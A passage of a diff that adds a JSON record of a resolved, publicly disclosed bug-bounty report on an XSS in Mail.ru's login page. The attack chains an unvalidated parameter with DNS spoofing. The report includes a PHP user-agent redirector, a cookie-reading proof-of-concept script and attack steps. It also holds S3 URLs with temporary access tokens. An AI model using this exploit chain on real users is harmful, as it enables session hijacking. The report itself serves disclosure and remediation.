@@ -1,0 +1,166 @@
+{
+  "id": 291522,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yOTE1MjI=",
+  "url": "https://hackerone.com/reports/291522",
+  "title": "XSS on account.mail.ru/login",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2017-11-18T16:24:10.588Z",
+  "submitted_at": "2017-11-18T16:24:10.588Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "obmi",
+    "url": "/obmi",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/005/212/50877789876ed8c80a2a19ccbd1a0da6b7dd0f07_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 65,
+    "url": "https://hackerone.com/mailru",
+    "handle": "mailru",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/065/1ec04a6b87b02422d913b5c53d5247de91d64718_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/065/1ec04a6b87b02422d913b5c53d5247de91d64718_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Mail.ru",
+      "twitter_handle": "",
+      "website": "https://vk.company/",
+      "about": "Building the Internet since 1998"
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2018-01-26T14:11:48.737Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2017-12-27T14:11:31.863Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "1. Уязвимость на станице https://account.mail.ru/login и подготовка файлов для атаки\n---------------------\n\nВ процессе исследования заметил, что на странице https://account.mail.ru/login не валидируется значение параметра v. Значение выводится на странице как есть и используется в пути до скрипта (т.е. атакующий может его изменить). \n\nПример:\n\n{F240637}\n\n2. Подмена хостов и загрузка ресурсов с другого домена.\n---------------------\n\nЯ предположил, что атака возможна, если заставить клиента скачивать скрипт с домена files.imgsmail.ru, меняя пусть к нему через уязвимость параметра v (описано выше)\nНа домене files.imgsmail.ru хостятся юзерские файлы, которые отправляются через агент. Единственное условие доступа к ним - совпадение юзерагента, поэтому нужен редиректор, приведенный ниже.\n\nУ атакующего нет возможности подменить домен с которого будет идти загрузка скрипта или контролировать содержимое файлов на img.imgsmail.ru. Если только он не контролирует dns сервер, которым пользуется жертва или вообще точку доступа (такое возможно, например в публичных сетях в кафе или торговом центре). Если dns сервер будет возвращать A запись о том, что img.imgsmail.ru соответствует адресу 178.237.20.77 (настоящий IP адрес для домена files.imgsmail.ru, откуда отдаются файлы, загруженные в agent), то браузер будет пытаться грузить ресурсы оттуда (а вот на files.imgsmail.ru атакер уже может заливать свой контент). \nДля теста я поднял и настроил dnsmasq по адресу 52.34.103.214 и вбил настройки в домашний роутер:\n\n```\nmihailob@kali:~dig  '@52.34.103.214' +short img.imgsmail.ru\n94.100.180.102\n```\n\n```\nmihailob@kali:~$ host img.imgsmail.ru\n<img.imgsmail.ru has address 94.100.180.102\n```\n\nНебольшое препятствие заключается в том, что сервер files.imgsmail.ru при доступе к файлам агента по прямой ссылке идентифицирует клиента по user-agent строчке. Поэтому атакующему необходимо загрузить файлы с необходимымы юзерагентами и составить табличку для нужных редиректов.\nЯ сделал такой простенький скрипт у себя на сервере:\n\n```\n<?php\n$client_ua = $_SERVER['HTTP_USER_AGENT'];\n\n//var_dump($client_ua);\n$redirect_url = 'https://account.mail.ru/login?v=0.3.13/../../../get/';\n$ua_routes = [\n        //FF Linux\n    'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0' => 'xgLens3gSCg20hivTRagWNJRagV09F1hUtAC3K9CioIhdEw7VhTMdkGKwqR9chXUcSWxg0hVDsrc1XBxfAMPWsZ7Mtigx6UIAKNvO1wguGm9lswX92YxmurFLxsehkKgsbKUWhd6Ds0gMFnvrx4bgpghRlTRag/test.js??',\n    //Win NT 6.1\n    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0' => 'ourROgRyY0ku4SBxmNtiAftNtiueG2xIF0E4niIFY8QIhIbSNsOVm37svkC3JIphAJEIaiT0sGnh6tRSGm4R0SdBEljIzlaJs1qhqp5Gqf7XO1rnnHZGOMD5WSuuwJgikJd8dGSM67pSOzv2ks0kPTQScKmNti/test.js?',\n    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0' => 'om2NJuByvqNogCHXvaUt3GvaUt8jzMdXpH9uotxgNnECLY1b2iY42SrCo5cJpmzPshamovxhUXZqzTztSdzOGCiG1kgCwriFECVb3g2tKaoeUiDpXzLmezd2mCMd7OhXQj0qDXddq6iChpGYRtkicPECWXvaUt/test.js??',\n    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0' => 'wFzJqfD5AQJjR1iyVvMGOQ4vMGqrIUxiC1gHvSqrfHAGWB6a0GMrG2HGPEJyC1Cypecsy2RraIqVyJy1RMCogGVAlL61qhB7mSrlrrys701JPsfU91gSA4ckgi563H71Rvl5EG4zFFX1GQjhHSIwZF2IW2VvMG/test.js?',\n    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0' => 'ZbDbdu16AYF2010DXyISt0XyIS8SL2IIu0tr5SJ7UdaGi36yIGVG9KsIzpfxfSgpKTQIxpPCK1nqHVrSDiKB6sX7udJGtvrvCGzHFiGiMXQy01KUVdqGAeVAI1zQ04miHe9zmGQGCYT1ejo80I9jr8tGwjXyIS/test.js?',\n    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0' => 'vpRuf62pV0FyCGmoE7Xi77a7XiCmcARSNSutsG4eO2nIxKm7fIOrW84InQz1tSLKAuWSdBHP6s876juGylvbbGbAl5f1GNYak1Mjgt7SM1p5aSMANl6SU1XSsIt8DaMIdOFiqIyxIRHSd7XIWSaTodKGoaE7Xi/test.js?',\n    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0' => 'OQLdZufaBxzcnxFr2znRM2znxHWlfdxeS07oKsAlw7KZOCFuKfqpmPhpcdleKAD4SusbGUK9KnmZsBgADpt9g40VtXsISqZXKkALtGsaisTMhGVd8HxJeXbph7ggAphyBpY9h3sXk4hUcXEbxQ5pXOxE82znx/test.js?',\n    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0' => 'OQLdZufaBxzcnxFr2znRM2znxHWlfdxeS07oKsAlw7KZOCFuKfqpmPhpcdleKAD4SusbGUK9KnmZsBgADpt9g40VtXsISqZXKkALtGsaisTMhGVd8HxJeXbph7ggAphyBpY9h3sXk4hUcXEbxQ5pXOxE82znx/test.js?',\n    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0' => 'mKXu3WpU65pDSClK0xEX6LQxEXBgQwImV93momlfXCwikA6ZWmTyuy6CTuLopXBuoDaiWqJ8cXEiIMNifkxqAC5v26vmQs6cBC8RFHJCsFfxXtTIGw0ihPyLImUAkW7XENNugtsCcbgmJLrvJmzCSreiIh0xEX/test.js?',\n    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0' => 'jUhPoHrrhcc2lXqPoiJCIzoiJCvMWqQCwDCu2X25qzimWNoj0tg3BU5XWQYMDtL3TX3CLlUdaiCPvxltOGtyXtLmqGRta445TC4syJaCa8oENmjNRwdtB1ugEiRLlBOtBafDytPomFNtjbSIUig1vxoi27oiJC/test.js?',\n    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0' => 'Pz4beFySYDyPP1RYUXbSHDcXbSWgeaNG853xb1IRUGpSV9Lj31ZGjtjGnqV3KG8gGvxIsFfOkGlEfjSIuAqBWSvebheGriFXGiyTHJgGdrBJpIeI6JvS0czWoS6lW3P1JQjOxIcawsaG1Wv8KigoWd5GCDUXbS/test.js?',\n    //\n    'Mozilla/5.0 (Windows NT 6.1; rv:48.0) Gecko/20100101 Firefox/48.0' => 'a4rrNIMBcXes0sJCPoQgHRToQg53mk5gR3hkLhII1c4gMIQWjxxttkHKTylx3sOn98yKI2nGgK9e2DZxurDPgxGZFcchE5vNtxCIgeosiTjRfsMlSFah9af5HKsbmfvg6CBrnx45lCVsZuPDvKShMVaxtnPoQg/test.js?',\n    'Mozilla/5.0 (Windows NT 6.1; rv:49.0) Gecko/20100101 Firefox/49.0' => 'SM7AU6KcSv4OoIbTfXlIoJ9XlIIFzvmS4zlFUGxBtfdGyqJDbIvImUjS9oCLJsCyajIGvj0gAGCecXtIV617TIrhBpa1UmvUVG9O8or1vevoIiU4xnZSco5Ss1eSsxsI4ARuPICyDYjILLqGnSUIo1iifJfXlI/test.js?',\n    'Mozilla/5.0 (Windows NT 6.1; rv:50.0) Gecko/20100101 Firefox/50.0' => 'qBcio58DE2Ty5ZKzZduZPKAduZTU8YbWqwjPjnb84lQRVWcybAhUu7pnhH5XaZndQHLnGGRrqAcQInZA8QwH4WNytuqAQ9QB4nq5XijRAVzAiZ0WqU5RagJNOnXuIbaAaZ8zbRVVltpRjcI4wWWIarknezZduZ/test.js?',\n    'Mozilla/5.0 (Windows NT 6.1; rv:51.0) Gecko/20100101 Firefox/51.0' => 'qBcio58DE2Ty5ZKzZduZPKAduZTU8YbWqwjPjnb84lQRVWcybAhUu7pnhH5XaZndQHLnGGRrqAcQInZA8QwH4WNytuqAQ9QB4nq5XijRAVzAiZ0WqU5RagJNOnXuIbaAaZ8zbRVVltpRjcI4wWWIarknezZduZ/test.js?',\n    'Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0' => 'klBBESp2lWvq4KkR8e2gBs0e2gRSxqRsuzYzFKTXCeBx2izlqx1DmuxxlWqmssq1FT6hqc55IKREonIgs6EZHg1CriJKT8ApLx0X1bUgZaSVaKixf9RKG0aA8giwofJxoeC0XhVhtWBgDtqQtsh42PJKr38e2g/test.js?',\n    'Mozilla/5.0 (Windows NT 6.1; rv:53.0) Gecko/20100101 Firefox/53.0' => 'dpDeMJHxyWyFOKxLulIsvxPlIsilnLIg0fpjyxnHR2nhwa7uih9dRLZg3gmgXgFvNpcx2TJqyKTRn8ehTWKmAhADBKsKD99cssN1dCSsJY0KMhlGNX0hRRKkpsMLGCIsAg7ZFhpLa3RgflEFahAqIWAsaBulIs/test.js?',\n    'Mozilla/5.0 (Windows NT 6.1; rv:54.0) Gecko/20100101 Firefox/54.0' => 'RbDCzTqxyZWfIKxLJ8us8B58usUJ4v9xsdGiAxQv6DbgjO3kAh1YCWPKEO8n2xGGogsxVPKvJhWUz91x81qLExT2mT6hDLPEgKcYz8KhKwWsGhl06zIh5Gs3rs5vPzZxLdBPoKE0Heag7An8AsYQOsLKv2J8us/test.js?',\n    'Mozilla/5.0 (Windows NT 6.1; rv:55.0) Gecko/20100101 Firefox/55.0' => 'kEOixDxyes0DHxLBBlAKx3LlAKNrNcrKeyJDdxJN7Xrg6snWsKqiMI3KgJz6Bxau1LjsnbaaHxO2pQjgfuNhjx4MrVXsowA7whUhLIwKGMWkjxnz6YIKns97Wh12BnMxbgVaphPxiMdsZ6t97KVpaGzgQkBlAK/test.js?',\n    'Mozilla/5.0 (Windows NT 6.1; rv:56.0) Gecko/20100101 Firefox/56.0' => 'OlNqOVzneOQjNXur6pDCWiUpDCnE4uYX7qIOPioH923ChlQzwiXkfmpmhKTOrmTesUwCf9i8yXLREVRmciRc0iKsQBktwmTfgmTXkJWmCtUXqmYOwlsXC09GjCC0AoLX0zupzir3ns0tZP7VNC8xDLsXW86pDC/test.js?',\n    'Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0' => 'mHkTlJNUd65apnQxf1PWM7Y1PWnRAFyWxpPSwZFcg3GRN9EMDWBdAhaZZQrEQnSaBuCRqEBBARNHzNyZHKQKGA1Guo0n9ZMYGWWW6a2ZmgQdRRm7va9nVkmEsABj2FaZoXv3rZoOHLqAAVX1JWlJcD9Wqy91PW/test.js?',\n    //Win NT.10\n    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:48.0) Gecko/20100101 Firefox/48.0' => 'YuXAP8AuGn7HFgyjjItsHsbItsgrGpSg9q42KxpdeNXKShwfoxhgUyCgMlEeHghTqrhx15zvixqb2j9K8lalnsknzbWsdIXqpxE3lsQs1zVRzxS0uTzx0hjZSxxhZa0KOloWss4UQsMhO6d7HhlFPPBKcDjIts/test.js?',\n    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0' => 'YxXfyOWmUU2w2nvkZHQWIenHQWyzdtbn1rqp0AIn13aZ0gKJWWNVWI6AKqG6RZzccBanM2IMEn3EgRcZuIBV6AB7X5dAuzHveZMhj1YZrWxQtRZh78jZhn5L1niXX8uAAklusn7Av4gAM1aQIZu73OwZZHZHQW/test.js?',\n    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0' => 'bYBZTCrdm8jZ9mlxvzjiyLlzjiALh3hX2QSGxmLcoJ3XrqhhTC7Kd4NXd6aMDCW78HzC77kCFtr5KCVXRRnRMtbkcPCtaiV8XXi6MnHC53VPEik7clECewpF3C2XHXWtvXT3EtPK90RtzN4FUi8YbAfm3ybzji/test.js?',\n    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:51.0) Gecko/20100101 Firefox/51.0' => 'QOBjrepKtgoa5gg0kH6rokH6xyIuiugzk7T6Kokm1vsp3hCJh3Mvs5hO41oTg6PtjDgKEeTNhFzbO8Kf4fLmgzJ4c3Ktulb3s8hZR6KMrYCoxvs9mxx4VgA2gOjFZihVO8kNxCdyMgK90tRKhvVKl9sE4kH6x/test.js?',\n    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0' => 'crUcnsXPdDZgbIGEwrlSzqPrlSXmTtCGM6OTTsft9AD1KUKNCGqlScKGGvjTUsPliaJ18qQx6sPTJA21I3qEbIrulcUGiFNbBsILbB0G3aRhnGOjSze1QZFsU1OnUqSIuua8oGXMh4RIrYbkDSG34V1inawrlS/test.js?',\n    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0' => 'wCdB7I5zX5NNCtpyW5bXXZZ5bXVCSqltWhOS3XQ4iFItagpystwjZmFCJs40JCmGXJitGT02YXoMJF9tlYxz9Crk5RaCq9ZHECvcauHiaUymNC4fINLi9LiASXJWFGZXua6IstlkEwNtt39pTt70YVUmd2W5bX/test.js?',\n    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0' => 'oTBkcbOHuUcYsWqqDsdWCPYsdW5PhHPAYOV3QZz5k1jZJjnwLAezYKpR8NEiAnYaegunHlqqbnUWgVUnZVt4NWKDFVQWfPwwUn5Dc9kZ6YaiQnSbR8rZSI6kgnkFg35nSMDzFWOAjZ7nb9zyYRFAwy3AlEDsdW/test.js?',\n    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0' => 'fy9ixvQKJIH4lKg9BZGhb7kZGhrSpIBhljfuPx0zOJoKQZZZDhFHBZ3sRY3hkxGvrBdxR8lsvsSP7JNhwWDL3g5fnSSsJjwtdhyrtArxwuUOmKpFN0WgUPsywgmhUIqh2k1qeh5BU1dgexFXnxTnr0HxERBZGh/test.js?',\n    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0' => 'aaSPTTusNXXrUgXx088gFF888guu4vBhi4RD8sz3ojNgDG4zQhf2bNpglMlBChpaXbuKb6issggYXSBKWfNo8KTXFckhpTqLtgnjQT4stW5fwKR3IC6g0ruobhSQwEhg19z8es3NN2uxp1VUhxrtmoBhryQ88g/test.js?',\n    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0' => 'Oya1mq9p9w2HatCXHuqmqw6uqm7MrGmXyUAngtAHciQX6St13mapMvRtOY8glidLOJbCN4Aw4CEVvy3m3ZEKwiDTE39tnwoZbiy9UzLXQVDLliJPoq8tciHsVXw9nYNt8ndmyX96lUJmlao4gtgk7ymCUXHuqm/test.js?',\n    //\n];\n\nif (!empty( $ua_routes[$client_ua] ) ) {\n        $destination = $redirect_url . $ua_routes[$client_ua];\n        header('Location: ' . $destination);\n}\nelse {\n        header(\"Content-Type: text/plain\");\n        echo 'Unknown user-agent:<'.$client_ua.'>';\n}\n```\n\nЯ заранее понаотправлял файлы через агент своему контакту с вышеприведенными юзерагентами. Содержимое загруженного файла было одинаково во всех случаях:\n\n```\nmihailob@kali:~/tmp cat test.js \nalert('Hello i am attacker script from uploaded file via agent. The script was executed on a domain:' + document.domain + '. The cookie are: ' + document.cookie );\n```\n\n{F240638}\n\n3. Сценарий атаки\n---------------------\n\n1. атакер конфигурирует сеть таким образом, что в качестве dns'а используется подконтрольный ему сервер. По запросу img.imgsmail.ru он будет давать ip 178.237.20.77 (адрес files.imgsmail.ru):\n2. жертва подключается к такой сети\n3. жертва открывает страницу по ссылке откуда-нибудь (ну или атакер подмешивает ей автоматическое открытие в http трафик, как делают показ рекламы в московском метро или в мобильном интернете) и запускает код атакующего\n\n4. POC:\n---------------------\n\nСтабильно воспроизводится в последнем Firefox, но не работает в Google chrome (в данном примере не работает потому что хрому нужен явный content-type для js). Думаю, что Firefox'а достаточно для пруфа.\n\n1. Выставить в настройках сети dns сервер: 52.34.103.214. \n2. Открыть ссылку-редиректор: https://obmhld.com/pocs/?token=b0c93dc547233c441e2316d87ff067c2\n\nЕсли вашего юзерагента не оказалось в моем списке - вы можете сами выставить на клиенте нужный юзерагент, который уже есть в редиректоре, чтобы убедиться в работоспособности сценария. Список приведен выше в исходниках редиректора.\nЕсли по каким-то причинам вы не можете использовать существующий - напишите мне, пожалуйста, - я добавлю ваш user-agent в список.\n\nЗаписал видео, как это выглядит у жертвы (браузер под виртуалкой - firefox 57 под win7, без дополнений и расширений, никаких манипуляций с сертификатами не проводил )\n\n{F240639}\n\n5. Как починить:\n---------------------\n\nКак быстрофикс - можно провалидировать хосты на машинах в конфиге nginx'а, чтобы не было возможности обращаться к серверу 178.237.20.77 с заголовком Host: img.imgsmail.ru.\nТакже нужно добавить более жесткую валидацию параметра v на странице https://account.mail.ru/login?\n\nP.S. Я уверен что в реальности сценарий может быть еще проще, если атакующий контролирует всю сеть. Он может, к примеру, заменить ответ на любой http запрос с целью редиректа пользователя с нужным параметром автоматически, такое можно наблюдать в московской подземке, где подмешивается реклама в контент http страниц или у мобильных операторов, мтс (по крайней мере в Москве) подсовывает свою рекламу в http ответы.\n\nP.S.p.s. Если что-то описал не совсем понятно - дайте мне знать, буду рад помочь.",
+  "weakness": {
+    "id": 30,
+    "name": "Man-in-the-Middle"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 240637,
+      "file_name": "screen_002.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/240/637/f5c44ed42fc26e34c52ef93e7119a50c7360cb1f/screen_002.png?response-content-disposition=attachment%3B%20filename%3D%22screen_002.png%22%3B%20filename%2A%3DUTF-8%27%27screen_002.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTUOKVM5L%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T125447Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD%2Bt0omVOHrZ9OL9Trk%2BdFKhBv%2FQrKC65W11rjrMgC%2F6QIhANia%2FTyBcfeu0XFctw1a%2FJDDLBAa34%2BWU%2F53rhxkz%2BKhKrEFCHUQAxoMMDEzNjE5Mjc0ODQ5IgxUKMbWt1VTh5nJA5MqjgWpIiqILEweaNhgRF6m1s3guYn11lerqJNrnFjeROxUEJywbXRrt%2FcAshROQMcI4IP1FF5kzaP6N8mOGtMrRL%2FiPu4S3YpijdtIekdCS1Sn6Snt4Sh4hrILW%2Bb8ze6H%2F8%2BUjG3tsefJ2i7e6RAZ95Jy%2FsR7Gyo717mGo8tT2xBovHwjfmR5eCTxEwySxWEQvCnkU8sWiVU4TVsVyZojCQaslBXYJlwFTmuq95Ka7nfTvMgKz2HKR%2BHa7dIsA2obOMA1gq914%2BAgrDq45xv0U8MzkvK2tpK9dfMSBVfPWAFHxIt5sREveo4mZ2nlBAm%2BX77TaBAPdROjeHNp2e8Y8GU73sHmCxPEQ6RVEBNo1Cpqin5nayoOUqgSikVBZNppJWCf78ZqDFx6xAksvybCUspLPt8UiXeCwawB4vSOwq1RhpGympS%2F4X%2BAfeB4Och%2Bx%2BOR8nKDDKe3Y%2BeIUIzmLq7R63lPB%2BEoYre1R8%2Bf%2F%2BYGK3IVaxII1oWPg4zPRX6SOnrZtXGjWyAfZ%2F6lNEUsc6rYsPzapeuVSlq%2FRTHQ%2BbWGOkn3wxqxzOCLbZSltQ7LZsPVDrrri2fFwWrFwoheZZCDY0vSRv08hDQ%2Fkq3xDInCDWZMeu%2FK40kiRmv6ehFATji5N1OJbLemuPO%2BTwvrdcBn9fQS4BkDMFIrGhE%2FuOwv61gkyL1fOapjm3KOWa8BmzAuFidAmAy%2BVnosQJMh3ckcvSXiD8sLINTU%2FbSsdV7beCmMpyf6fP3p%2F7VcwiGBABGo294shnTdhd2P0IxsSt7anyRTek2yB5NqzUYBr8WXNft2l3V3HTxgS9tRQXGp0RJdLlzDT1qxWJvF2JoUm4vQH5Pwhirc51bptu0N99Iwn6%2BtrgY6sAElrGju%2FXz82pDWWGfZvz6UL%2Fm95ZWtM25B7Ca5iNmiTQUqK%2BPhqtvh3TLN14mj%2BOXWFTSoPWS4IHLzNFsgx2J0aY83%2FElbkWzC43VwT7caBSFcI5aYu4krRCov2TutbftS11vV1dOme5hlM9%2Bf%2FlUY4xpo4dgVYdlW83DxHU%2BAO74ifhWVTZa4oAIO7OK8ImejZkl87d9LyTXqXHcY75D4o2LMg4shUYHjgRj5VB%2BvcA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a86bbadf1e8549c6c0fbb3b818ad279c7367c1eedb65c4ec273baad7084570b8",
+      "file_size": 201518,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 240638,
+      "file_name": "screen_003.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/240/638/7e4ed82227e3a28cbf64a8819d8b103862f8e8c5/screen_003.png?response-content-disposition=attachment%3B%20filename%3D%22screen_003.png%22%3B%20filename%2A%3DUTF-8%27%27screen_003.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTUOKVM5L%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T125447Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD%2Bt0omVOHrZ9OL9Trk%2BdFKhBv%2FQrKC65W11rjrMgC%2F6QIhANia%2FTyBcfeu0XFctw1a%2FJDDLBAa34%2BWU%2F53rhxkz%2BKhKrEFCHUQAxoMMDEzNjE5Mjc0ODQ5IgxUKMbWt1VTh5nJA5MqjgWpIiqILEweaNhgRF6m1s3guYn11lerqJNrnFjeROxUEJywbXRrt%2FcAshROQMcI4IP1FF5kzaP6N8mOGtMrRL%2FiPu4S3YpijdtIekdCS1Sn6Snt4Sh4hrILW%2Bb8ze6H%2F8%2BUjG3tsefJ2i7e6RAZ95Jy%2FsR7Gyo717mGo8tT2xBovHwjfmR5eCTxEwySxWEQvCnkU8sWiVU4TVsVyZojCQaslBXYJlwFTmuq95Ka7nfTvMgKz2HKR%2BHa7dIsA2obOMA1gq914%2BAgrDq45xv0U8MzkvK2tpK9dfMSBVfPWAFHxIt5sREveo4mZ2nlBAm%2BX77TaBAPdROjeHNp2e8Y8GU73sHmCxPEQ6RVEBNo1Cpqin5nayoOUqgSikVBZNppJWCf78ZqDFx6xAksvybCUspLPt8UiXeCwawB4vSOwq1RhpGympS%2F4X%2BAfeB4Och%2Bx%2BOR8nKDDKe3Y%2BeIUIzmLq7R63lPB%2BEoYre1R8%2Bf%2F%2BYGK3IVaxII1oWPg4zPRX6SOnrZtXGjWyAfZ%2F6lNEUsc6rYsPzapeuVSlq%2FRTHQ%2BbWGOkn3wxqxzOCLbZSltQ7LZsPVDrrri2fFwWrFwoheZZCDY0vSRv08hDQ%2Fkq3xDInCDWZMeu%2FK40kiRmv6ehFATji5N1OJbLemuPO%2BTwvrdcBn9fQS4BkDMFIrGhE%2FuOwv61gkyL1fOapjm3KOWa8BmzAuFidAmAy%2BVnosQJMh3ckcvSXiD8sLINTU%2FbSsdV7beCmMpyf6fP3p%2F7VcwiGBABGo294shnTdhd2P0IxsSt7anyRTek2yB5NqzUYBr8WXNft2l3V3HTxgS9tRQXGp0RJdLlzDT1qxWJvF2JoUm4vQH5Pwhirc51bptu0N99Iwn6%2BtrgY6sAElrGju%2FXz82pDWWGfZvz6UL%2Fm95ZWtM25B7Ca5iNmiTQUqK%2BPhqtvh3TLN14mj%2BOXWFTSoPWS4IHLzNFsgx2J0aY83%2FElbkWzC43VwT7caBSFcI5aYu4krRCov2TutbftS11vV1dOme5hlM9%2Bf%2FlUY4xpo4dgVYdlW83DxHU%2BAO74ifhWVTZa4oAIO7OK8ImejZkl87d9LyTXqXHcY75D4o2LMg4shUYHjgRj5VB%2BvcA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=bd8fd28d5f232f84fc70fd818ad9df519ef0f9ab35ae27986e694402c9eaf9fd",
+      "file_size": 68807,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 240639,
+      "file_name": "Screencast_18.11.2017_18_16_10.webm",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/240/639/d0650584495ef97d545e2aa0088f12c21109e6fe/Screencast_18.11.2017_18_16_10.webm?response-content-disposition=attachment%3B%20filename%3D%22Screencast_18.11.2017_18_16_10.webm%22%3B%20filename%2A%3DUTF-8%27%27Screencast_18.11.2017_18_16_10.webm&response-content-type=video%2Fwebm&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTUOKVM5L%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T125447Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD%2Bt0omVOHrZ9OL9Trk%2BdFKhBv%2FQrKC65W11rjrMgC%2F6QIhANia%2FTyBcfeu0XFctw1a%2FJDDLBAa34%2BWU%2F53rhxkz%2BKhKrEFCHUQAxoMMDEzNjE5Mjc0ODQ5IgxUKMbWt1VTh5nJA5MqjgWpIiqILEweaNhgRF6m1s3guYn11lerqJNrnFjeROxUEJywbXRrt%2FcAshROQMcI4IP1FF5kzaP6N8mOGtMrRL%2FiPu4S3YpijdtIekdCS1Sn6Snt4Sh4hrILW%2Bb8ze6H%2F8%2BUjG3tsefJ2i7e6RAZ95Jy%2FsR7Gyo717mGo8tT2xBovHwjfmR5eCTxEwySxWEQvCnkU8sWiVU4TVsVyZojCQaslBXYJlwFTmuq95Ka7nfTvMgKz2HKR%2BHa7dIsA2obOMA1gq914%2BAgrDq45xv0U8MzkvK2tpK9dfMSBVfPWAFHxIt5sREveo4mZ2nlBAm%2BX77TaBAPdROjeHNp2e8Y8GU73sHmCxPEQ6RVEBNo1Cpqin5nayoOUqgSikVBZNppJWCf78ZqDFx6xAksvybCUspLPt8UiXeCwawB4vSOwq1RhpGympS%2F4X%2BAfeB4Och%2Bx%2BOR8nKDDKe3Y%2BeIUIzmLq7R63lPB%2BEoYre1R8%2Bf%2F%2BYGK3IVaxII1oWPg4zPRX6SOnrZtXGjWyAfZ%2F6lNEUsc6rYsPzapeuVSlq%2FRTHQ%2BbWGOkn3wxqxzOCLbZSltQ7LZsPVDrrri2fFwWrFwoheZZCDY0vSRv08hDQ%2Fkq3xD